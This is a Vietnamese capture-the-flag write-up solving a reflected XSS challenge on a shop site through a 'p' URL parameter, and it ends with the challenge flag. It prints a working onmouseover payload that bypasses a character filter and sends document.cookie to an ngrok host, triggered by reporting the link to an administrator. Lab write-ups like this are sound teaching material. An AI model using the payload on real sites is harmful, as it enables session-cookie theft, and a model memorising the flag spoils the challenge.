# XSS - Reflected
## Solution

Đầu tiên khi vào website challenge thì ta thấy đây là một trang bán hàng với nhiều sản phẩm ta có thể lựa chọn.

![image](https://user-images.githubusercontent.com/86184794/160854756-2a911f4a-c30d-41c7-b26f-e8931a20d2a2.png)

Em chọn bất kỳ một sản phẩm thì thấy trên url của nó có chứa tham số p.

![image](https://user-images.githubusercontent.com/86184794/160856197-c8bb8240-a216-4e2b-8d85-2154bd5f33e0.png)

Ý tưởng là em có thể tận dụng tham số p này để khai thác challenge này được.

![image](https://user-images.githubusercontent.com/86184794/160856376-273c3d67-d1dd-4490-8a25-da2d7c58890f.png)

Trong DOM Element em thấy các sản phẩm đều có thuộc tính href với nội dung là tham số p ở trên nên em sẽ khai thác đường link này bằng cách thay đổi đường link trở đến server ảo của em đã tạo bên máy kali.

![image](https://user-images.githubusercontent.com/86184794/160859347-da86c9a6-15eb-4e34-891c-b1c58497a0da.png)

Vì đường link này bị format nên các kí tự đặc biệt như () + - * / sẽ bị lượt bỏ nên em sử dụng document.location và concat để nối chuỗi để tránh các kị tự đó.

Nhưng khi click vào đường link vẫn không lấy được cookie.

![image](https://user-images.githubusercontent.com/86184794/160863558-00414abf-6479-4a41-8ec4-4fd86d9325a7.png)

Em thấy trên url thì giá trị biến p chỉ lưu giá trị binh nên cookie nó sẽ không trả về server của chúng ta. Muốn cho nó trả về thì giá trị của biến p phải lưu luôn cái chuỗi này.
```
 hacking' onmouseover='document.location="http://7fe9-118-32-228-61.ngrok.io?cookie=".concat(document.cookie);
```
À vậy thì em sẽ không sửa trong DOM Element nữa em sẽ sửa trên đường dẫn rồi cho chạy thử.

![image](https://user-images.githubusercontent.com/86184794/160865182-ebdebc14-1da7-4835-9a10-d995b6eab43a.png)

Nhưng vẫn không lấy được cookie vì request này không được gửi đến server. Để gửi đến server nữa thì chúng ta phải click vào report to the administrator

![image](https://user-images.githubusercontent.com/86184794/160867444-20f9e61e-550e-4d3e-869d-f74e902414cc.png)

FLag: r3fL3ct3D_XsS_fTw
